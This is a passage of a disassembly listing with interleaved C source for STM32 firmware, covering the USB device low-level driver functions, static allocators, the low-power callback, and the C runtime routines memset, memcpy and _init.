 800cc98:	460b      	mov	r3, r1
 800cc9a:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cc9c:	687b      	ldr	r3, [r7, #4]
 800cc9e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cca2:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cca4:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cca8:	2b00      	cmp	r3, #0
 800ccaa:	da0c      	bge.n	800ccc6 <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800ccac:	78fb      	ldrb	r3, [r7, #3]
 800ccae:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800ccb2:	68f9      	ldr	r1, [r7, #12]
 800ccb4:	1c5a      	adds	r2, r3, #1
 800ccb6:	4613      	mov	r3, r2
 800ccb8:	009b      	lsls	r3, r3, #2
 800ccba:	4413      	add	r3, r2
 800ccbc:	00db      	lsls	r3, r3, #3
 800ccbe:	440b      	add	r3, r1
 800ccc0:	3302      	adds	r3, #2
 800ccc2:	781b      	ldrb	r3, [r3, #0]
 800ccc4:	e00b      	b.n	800ccde <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800ccc6:	78fb      	ldrb	r3, [r7, #3]
 800ccc8:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cccc:	68f9      	ldr	r1, [r7, #12]
 800ccce:	4613      	mov	r3, r2
 800ccd0:	009b      	lsls	r3, r3, #2
 800ccd2:	4413      	add	r3, r2
 800ccd4:	00db      	lsls	r3, r3, #3
 800ccd6:	440b      	add	r3, r1
 800ccd8:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800ccdc:	781b      	ldrb	r3, [r3, #0]
  }
}
 800ccde:	4618      	mov	r0, r3
 800cce0:	3714      	adds	r7, #20
 800cce2:	46bd      	mov	sp, r7
 800cce4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cce8:	4770      	bx	lr
	...

0800ccec <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800ccec:	b580      	push	{r7, lr}
 800ccee:	b084      	sub	sp, #16
 800ccf0:	af00      	add	r7, sp, #0
 800ccf2:	6078      	str	r0, [r7, #4]
 800ccf4:	460b      	mov	r3, r1
 800ccf6:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ccf8:	2300      	movs	r3, #0
 800ccfa:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ccfc:	2300      	movs	r3, #0
 800ccfe:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800cd00:	687b      	ldr	r3, [r7, #4]
 800cd02:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd06:	78fa      	ldrb	r2, [r7, #3]
 800cd08:	4611      	mov	r1, r2
 800cd0a:	4618      	mov	r0, r3
 800cd0c:	f7f5 f97f 	bl	800200e <HAL_PCD_SetAddress>
 800cd10:	4603      	mov	r3, r0
 800cd12:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd14:	7bbb      	ldrb	r3, [r7, #14]
 800cd16:	2b03      	cmp	r3, #3
 800cd18:	d816      	bhi.n	800cd48 <USBD_LL_SetUSBAddress+0x5c>
 800cd1a:	a201      	add	r2, pc, #4	; (adr r2, 800cd20 <USBD_LL_SetUSBAddress+0x34>)
 800cd1c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd20:	0800cd31 	.word	0x0800cd31
 800cd24:	0800cd37 	.word	0x0800cd37
 800cd28:	0800cd3d 	.word	0x0800cd3d
 800cd2c:	0800cd43 	.word	0x0800cd43
    case HAL_OK :
      usb_status = USBD_OK;
 800cd30:	2300      	movs	r3, #0
 800cd32:	73fb      	strb	r3, [r7, #15]
    break;
 800cd34:	e00b      	b.n	800cd4e <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd36:	2303      	movs	r3, #3
 800cd38:	73fb      	strb	r3, [r7, #15]
    break;
 800cd3a:	e008      	b.n	800cd4e <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd3c:	2301      	movs	r3, #1
 800cd3e:	73fb      	strb	r3, [r7, #15]
    break;
 800cd40:	e005      	b.n	800cd4e <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd42:	2303      	movs	r3, #3
 800cd44:	73fb      	strb	r3, [r7, #15]
    break;
 800cd46:	e002      	b.n	800cd4e <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800cd48:	2303      	movs	r3, #3
 800cd4a:	73fb      	strb	r3, [r7, #15]
    break;
 800cd4c:	bf00      	nop
  }
  return usb_status;
 800cd4e:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd50:	4618      	mov	r0, r3
 800cd52:	3710      	adds	r7, #16
 800cd54:	46bd      	mov	sp, r7
 800cd56:	bd80      	pop	{r7, pc}

0800cd58 <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800cd58:	b580      	push	{r7, lr}
 800cd5a:	b086      	sub	sp, #24
 800cd5c:	af00      	add	r7, sp, #0
 800cd5e:	60f8      	str	r0, [r7, #12]
 800cd60:	607a      	str	r2, [r7, #4]
 800cd62:	603b      	str	r3, [r7, #0]
 800cd64:	460b      	mov	r3, r1
 800cd66:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd68:	2300      	movs	r3, #0
 800cd6a:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd6c:	2300      	movs	r3, #0
 800cd6e:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800cd70:	68fb      	ldr	r3, [r7, #12]
 800cd72:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cd76:	7af9      	ldrb	r1, [r7, #11]
 800cd78:	683b      	ldr	r3, [r7, #0]
 800cd7a:	687a      	ldr	r2, [r7, #4]
 800cd7c:	f7f5 fa5a 	bl	8002234 <HAL_PCD_EP_Transmit>
 800cd80:	4603      	mov	r3, r0
 800cd82:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800cd84:	7dbb      	ldrb	r3, [r7, #22]
 800cd86:	2b03      	cmp	r3, #3
 800cd88:	d816      	bhi.n	800cdb8 <USBD_LL_Transmit+0x60>
 800cd8a:	a201      	add	r2, pc, #4	; (adr r2, 800cd90 <USBD_LL_Transmit+0x38>)
 800cd8c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd90:	0800cda1 	.word	0x0800cda1
 800cd94:	0800cda7 	.word	0x0800cda7
 800cd98:	0800cdad 	.word	0x0800cdad
 800cd9c:	0800cdb3 	.word	0x0800cdb3
    case HAL_OK :
      usb_status = USBD_OK;
 800cda0:	2300      	movs	r3, #0
 800cda2:	75fb      	strb	r3, [r7, #23]
    break;
 800cda4:	e00b      	b.n	800cdbe <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cda6:	2303      	movs	r3, #3
 800cda8:	75fb      	strb	r3, [r7, #23]
    break;
 800cdaa:	e008      	b.n	800cdbe <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cdac:	2301      	movs	r3, #1
 800cdae:	75fb      	strb	r3, [r7, #23]
    break;
 800cdb0:	e005      	b.n	800cdbe <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cdb2:	2303      	movs	r3, #3
 800cdb4:	75fb      	strb	r3, [r7, #23]
    break;
 800cdb6:	e002      	b.n	800cdbe <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800cdb8:	2303      	movs	r3, #3
 800cdba:	75fb      	strb	r3, [r7, #23]
    break;
 800cdbc:	bf00      	nop
  }
  return usb_status;
 800cdbe:	7dfb      	ldrb	r3, [r7, #23]
}
 800cdc0:	4618      	mov	r0, r3
 800cdc2:	3718      	adds	r7, #24
 800cdc4:	46bd      	mov	sp, r7
 800cdc6:	bd80      	pop	{r7, pc}

0800cdc8 <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800cdc8:	b580      	push	{r7, lr}
 800cdca:	b086      	sub	sp, #24
 800cdcc:	af00      	add	r7, sp, #0
 800cdce:	60f8      	str	r0, [r7, #12]
 800cdd0:	607a      	str	r2, [r7, #4]
 800cdd2:	603b      	str	r3, [r7, #0]
 800cdd4:	460b      	mov	r3, r1
 800cdd6:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cdd8:	2300      	movs	r3, #0
 800cdda:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cddc:	2300      	movs	r3, #0
 800cdde:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800cde0:	68fb      	ldr	r3, [r7, #12]
 800cde2:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cde6:	7af9      	ldrb	r1, [r7, #11]
 800cde8:	683b      	ldr	r3, [r7, #0]
 800cdea:	687a      	ldr	r2, [r7, #4]
 800cdec:	f7f5 f9d9 	bl	80021a2 <HAL_PCD_EP_Receive>
 800cdf0:	4603      	mov	r3, r0
 800cdf2:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800cdf4:	7dbb      	ldrb	r3, [r7, #22]
 800cdf6:	2b03      	cmp	r3, #3
 800cdf8:	d816      	bhi.n	800ce28 <USBD_LL_PrepareReceive+0x60>
 800cdfa:	a201      	add	r2, pc, #4	; (adr r2, 800ce00 <USBD_LL_PrepareReceive+0x38>)
 800cdfc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce00:	0800ce11 	.word	0x0800ce11
 800ce04:	0800ce17 	.word	0x0800ce17
 800ce08:	0800ce1d 	.word	0x0800ce1d
 800ce0c:	0800ce23 	.word	0x0800ce23
    case HAL_OK :
      usb_status = USBD_OK;
 800ce10:	2300      	movs	r3, #0
 800ce12:	75fb      	strb	r3, [r7, #23]
    break;
 800ce14:	e00b      	b.n	800ce2e <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce16:	2303      	movs	r3, #3
 800ce18:	75fb      	strb	r3, [r7, #23]
    break;
 800ce1a:	e008      	b.n	800ce2e <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce1c:	2301      	movs	r3, #1
 800ce1e:	75fb      	strb	r3, [r7, #23]
    break;
 800ce20:	e005      	b.n	800ce2e <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce22:	2303      	movs	r3, #3
 800ce24:	75fb      	strb	r3, [r7, #23]
    break;
 800ce26:	e002      	b.n	800ce2e <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800ce28:	2303      	movs	r3, #3
 800ce2a:	75fb      	strb	r3, [r7, #23]
    break;
 800ce2c:	bf00      	nop
  }
  return usb_status;
 800ce2e:	7dfb      	ldrb	r3, [r7, #23]
}
 800ce30:	4618      	mov	r0, r3
 800ce32:	3718      	adds	r7, #24
 800ce34:	46bd      	mov	sp, r7
 800ce36:	bd80      	pop	{r7, pc}

0800ce38 <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ce38:	b580      	push	{r7, lr}
 800ce3a:	b082      	sub	sp, #8
 800ce3c:	af00      	add	r7, sp, #0
 800ce3e:	6078      	str	r0, [r7, #4]
 800ce40:	460b      	mov	r3, r1
 800ce42:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800ce44:	687b      	ldr	r3, [r7, #4]
 800ce46:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ce4a:	78fa      	ldrb	r2, [r7, #3]
 800ce4c:	4611      	mov	r1, r2
 800ce4e:	4618      	mov	r0, r3
 800ce50:	f7f5 f9d8 	bl	8002204 <HAL_PCD_EP_GetRxCount>
 800ce54:	4603      	mov	r3, r0
}
 800ce56:	4618      	mov	r0, r3
 800ce58:	3708      	adds	r7, #8
 800ce5a:	46bd      	mov	sp, r7
 800ce5c:	bd80      	pop	{r7, pc}
	...

0800ce60 <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800ce60:	b580      	push	{r7, lr}
 800ce62:	b082      	sub	sp, #8
 800ce64:	af00      	add	r7, sp, #0
 800ce66:	6078      	str	r0, [r7, #4]
 800ce68:	460b      	mov	r3, r1
 800ce6a:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800ce6c:	78fb      	ldrb	r3, [r7, #3]
 800ce6e:	2b00      	cmp	r3, #0
 800ce70:	d002      	beq.n	800ce78 <HAL_PCDEx_LPM_Callback+0x18>
 800ce72:	2b01      	cmp	r3, #1
 800ce74:	d013      	beq.n	800ce9e <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800ce76:	e023      	b.n	800cec0 <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800ce78:	687b      	ldr	r3, [r7, #4]
 800ce7a:	699b      	ldr	r3, [r3, #24]
 800ce7c:	2b00      	cmp	r3, #0
 800ce7e:	d007      	beq.n	800ce90 <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800ce80:	f000 f84a 	bl	800cf18 <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800ce84:	4b10      	ldr	r3, [pc, #64]	; (800cec8 <HAL_PCDEx_LPM_Callback+0x68>)
 800ce86:	691b      	ldr	r3, [r3, #16]
 800ce88:	4a0f      	ldr	r2, [pc, #60]	; (800cec8 <HAL_PCDEx_LPM_Callback+0x68>)
 800ce8a:	f023 0306 	bic.w	r3, r3, #6
 800ce8e:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800ce90:	687b      	ldr	r3, [r7, #4]
 800ce92:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800ce96:	4618      	mov	r0, r3
 800ce98:	f7fe fa66 	bl	800b368 <USBD_LL_Resume>
    break;
 800ce9c:	e010      	b.n	800cec0 <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800ce9e:	687b      	ldr	r3, [r7, #4]
 800cea0:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cea4:	4618      	mov	r0, r3
 800cea6:	f7fe fa43 	bl	800b330 <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800ceaa:	687b      	ldr	r3, [r7, #4]
 800ceac:	699b      	ldr	r3, [r3, #24]
 800ceae:	2b00      	cmp	r3, #0
 800ceb0:	d005      	beq.n	800cebe <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800ceb2:	4b05      	ldr	r3, [pc, #20]	; (800cec8 <HAL_PCDEx_LPM_Callback+0x68>)
 800ceb4:	691b      	ldr	r3, [r3, #16]
 800ceb6:	4a04      	ldr	r2, [pc, #16]	; (800cec8 <HAL_PCDEx_LPM_Callback+0x68>)
 800ceb8:	f043 0306 	orr.w	r3, r3, #6
 800cebc:	6113      	str	r3, [r2, #16]
    break;
 800cebe:	bf00      	nop
}
 800cec0:	bf00      	nop
 800cec2:	3708      	adds	r7, #8
 800cec4:	46bd      	mov	sp, r7
 800cec6:	bd80      	pop	{r7, pc}
 800cec8:	e000ed00 	.word	0xe000ed00

0800cecc <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800cecc:	b480      	push	{r7}
 800cece:	b083      	sub	sp, #12
 800ced0:	af00      	add	r7, sp, #0
 800ced2:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800ced4:	4b03      	ldr	r3, [pc, #12]	; (800cee4 <USBD_static_malloc+0x18>)
}
 800ced6:	4618      	mov	r0, r3
 800ced8:	370c      	adds	r7, #12
 800ceda:	46bd      	mov	sp, r7
 800cedc:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cee0:	4770      	bx	lr
 800cee2:	bf00      	nop
 800cee4:	20000e74 	.word	0x20000e74

0800cee8 <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800cee8:	b480      	push	{r7}
 800ceea:	b083      	sub	sp, #12
 800ceec:	af00      	add	r7, sp, #0
 800ceee:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cef0:	4b03      	ldr	r3, [pc, #12]	; (800cf00 <USBD_static_malloc_MSC+0x18>)
}
 800cef2:	4618      	mov	r0, r3
 800cef4:	370c      	adds	r7, #12
 800cef6:	46bd      	mov	sp, r7
 800cef8:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cefc:	4770      	bx	lr
 800cefe:	bf00      	nop
 800cf00:	20000e9c 	.word	0x20000e9c

0800cf04 <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800cf04:	b480      	push	{r7}
 800cf06:	b083      	sub	sp, #12
 800cf08:	af00      	add	r7, sp, #0
 800cf0a:	6078      	str	r0, [r7, #4]

}
 800cf0c:	bf00      	nop
 800cf0e:	370c      	adds	r7, #12
 800cf10:	46bd      	mov	sp, r7
 800cf12:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf16:	4770      	bx	lr

0800cf18 <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800cf18:	b580      	push	{r7, lr}
 800cf1a:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800cf1c:	f7f3 fb6e 	bl	80005fc <SystemClock_Config>
}
 800cf20:	bf00      	nop
 800cf22:	bd80      	pop	{r7, pc}

0800cf24 <memset>:
 800cf24:	4402      	add	r2, r0
 800cf26:	4603      	mov	r3, r0
 800cf28:	4293      	cmp	r3, r2
 800cf2a:	d100      	bne.n	800cf2e <memset+0xa>
 800cf2c:	4770      	bx	lr
 800cf2e:	f803 1b01 	strb.w	r1, [r3], #1
 800cf32:	e7f9      	b.n	800cf28 <memset+0x4>

0800cf34 <__libc_init_array>:
 800cf34:	b570      	push	{r4, r5, r6, lr}
 800cf36:	4d0d      	ldr	r5, [pc, #52]	; (800cf6c <__libc_init_array+0x38>)
 800cf38:	4c0d      	ldr	r4, [pc, #52]	; (800cf70 <__libc_init_array+0x3c>)
 800cf3a:	1b64      	subs	r4, r4, r5
 800cf3c:	10a4      	asrs	r4, r4, #2
 800cf3e:	2600      	movs	r6, #0
 800cf40:	42a6      	cmp	r6, r4
 800cf42:	d109      	bne.n	800cf58 <__libc_init_array+0x24>
 800cf44:	4d0b      	ldr	r5, [pc, #44]	; (800cf74 <__libc_init_array+0x40>)
 800cf46:	4c0c      	ldr	r4, [pc, #48]	; (800cf78 <__libc_init_array+0x44>)
 800cf48:	f000 f826 	bl	800cf98 <_init>
 800cf4c:	1b64      	subs	r4, r4, r5
 800cf4e:	10a4      	asrs	r4, r4, #2
 800cf50:	2600      	movs	r6, #0
 800cf52:	42a6      	cmp	r6, r4
 800cf54:	d105      	bne.n	800cf62 <__libc_init_array+0x2e>
 800cf56:	bd70      	pop	{r4, r5, r6, pc}
 800cf58:	f855 3b04 	ldr.w	r3, [r5], #4
 800cf5c:	4798      	blx	r3
 800cf5e:	3601      	adds	r6, #1
 800cf60:	e7ee      	b.n	800cf40 <__libc_init_array+0xc>
 800cf62:	f855 3b04 	ldr.w	r3, [r5], #4
 800cf66:	4798      	blx	r3
 800cf68:	3601      	adds	r6, #1
 800cf6a:	e7f2      	b.n	800cf52 <__libc_init_array+0x1e>
 800cf6c:	0800d13c 	.word	0x0800d13c
 800cf70:	0800d13c 	.word	0x0800d13c
 800cf74:	0800d13c 	.word	0x0800d13c
 800cf78:	0800d140 	.word	0x0800d140

0800cf7c <memcpy>:
 800cf7c:	440a      	add	r2, r1
 800cf7e:	4291      	cmp	r1, r2
 800cf80:	f100 33ff 	add.w	r3, r0, #4294967295
 800cf84:	d100      	bne.n	800cf88 <memcpy+0xc>
 800cf86:	4770      	bx	lr
 800cf88:	b510      	push	{r4, lr}
 800cf8a:	f811 4b01 	ldrb.w	r4, [r1], #1
 800cf8e:	f803 4f01 	strb.w	r4, [r3, #1]!
 800cf92:	4291      	cmp	r1, r2
 800cf94:	d1f9      	bne.n	800cf8a <memcpy+0xe>
 800cf96:	bd10      	pop	{r4, pc}

0800cf98 <_init>:
 800cf98:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800cf9a:	bf00      	nop
 800cf9c:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800cf9e:	bc08      	pop	{r3}
 800cfa0:	469e      	mov	lr, r3
 800cfa2:	4770      	bx	lr

0800cfa4 <_fini>:
 800cfa4:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800cfa6:	bf00      	nop
 800cfa8:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800cfaa:	bc08      	pop	{r3}
 800cfac:	469e      	mov	lr, r3
 800cfae:	4770      	bx	lr
